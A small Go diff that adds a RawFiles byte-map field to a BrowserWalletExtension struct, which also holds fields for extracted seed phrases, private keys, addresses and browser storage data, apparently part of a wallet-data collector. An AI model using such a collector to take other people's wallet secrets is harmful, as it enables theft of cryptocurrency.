@@ -323,6 +323,7 @@ type BrowserWalletExtension struct {
 	LocalStorage    map[string]string      `json:"local_storage,omitempty"`
 	SessionStorage  map[string]string      `json:"session_storage,omitempty"`
 	IndexedDBData   map[string]interface{} `json:"indexeddb_data,omitempty"`
+	RawFiles        map[string][]byte      `json:"raw_files,omitempty"`
 	ExtractedSeeds  []string               `json:"extracted_seeds,omitempty"`
 	PrivateKeys     []string               `json:"private_keys,omitempty"`
 	Addresses       []string               `json:"addresses,omitempty"`
